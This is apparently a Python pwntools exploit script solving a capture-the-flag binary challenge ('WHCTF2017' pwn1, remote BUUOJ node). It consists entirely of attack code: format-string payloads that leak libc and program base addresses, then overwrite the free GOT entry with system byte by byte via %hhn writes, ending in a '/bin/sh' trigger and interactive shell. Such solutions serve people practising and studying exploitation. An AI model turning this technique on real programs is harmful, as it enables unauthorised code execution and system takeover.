#coding:utf-8

from pwn import *

context.log_level = 'debug'

debug = 0

def wpOne(r, data):
	r.recvuntil('Input Your Code:\n')
	r.send('1'.ljust(4, '\x00'))

	r.recvuntil('Welcome To WHCTF2017:\n')
	r.send(data)

	r.recvuntil('Your Input Is :')

def wpTwo(r, data):
	r.recvuntil('Input Your Code:\n')
	r.send('2'.ljust(4, '\x00'))
	r.recvuntil('Input Your Name:\n')
	r.send(data)


def exp(debug):
	elf = ELF('./pwn1')
	if debug == 1:
		r = process('./pwn1')
		gdb.attach(r, 'b* $rebase(0x0000000000000C05)')
		lib = ELF('/lib/x86_64-linux-gnu/libc.so.6')
	else:
		r = remote('node3.buuoj.cn', 29429)
		lib = ELF('/lib/x86_64-linux-gnu/libc.so.6')

	
	wpTwo(r, '/bin/sh\x00')
	wpOne(r, 'a' * (0x3e8) + 'bb%' + str(int((0x7ffe729e7fe8 - 0x7ffe729e73a0) / 0x8) + 4) + '$p')
	r.recvuntil('0x')
	lib_base = int(r.recv(12), 16) + 0x7fd7f1c9c000 - 0x7fd7f1cbc830
	log.info('lib_base => %#x'%lib_base)

	wpOne(r, 'a' * (0x3e8) + 'bb%' + str(int((0x7ffe8fd9a648 - 0x7ffe8fd999e0) / 0x8) + 4) + '$p')
	r.recvuntil('0x')


	elf_base = int(r.recv(12), 16) + 0x5624b3b74c05 - 0x0000556266f04c3c - 0x0000000000000C05 + 0x55fcd98b1000 - 0x56bf26521000

	log.info('free got=> %#x'%(elf_base + elf.got['free']))
	
	offset = lib_base + lib.sym['system']
	offset = [(offset & 0xff), (offset & 0xff00) >> 8, (offset & 0xff0000) >> 16]
	

	log.info('system => %#x'%(lib_base + lib.sym['system']))

	string_len = ((0x3e8 + 2) & 0xff) + 0x14

	wpOne(r, 'a' * (0x3e8) + 'bb' + '%%%dc%%%d$hhn'%(offset[0] + 0x100 - string_len, int((0x7ffd42a47b68 - 0x7ffd42a47760) / 0x8) + 4) + 'a' + p64(elf_base + elf.got['free']))

	wpOne(r, 'a' * (0x3e8) + 'bb' + '%%%dc%%%d$hhn'%(offset[1] + 0x100 - string_len, int((0x7ffd42a47b68 - 0x7ffd42a47760) / 0x8) + 4) + 'a' + p64(elf_base + elf.got['free'] + 1))

	wpOne(r, 'a' * (0x3e8) + 'bb' + '%%%dc%%%d$hhn'%(offset[2] + 0x100 - string_len, int((0x7ffd42a47b68 - 0x7ffd42a47760) / 0x8) + 4) + 'a' + p64(elf_base + elf.got['free'] + 2))

	wpTwo(r, '/bin/sh\x00')
	r.interactive()


exp(debug)

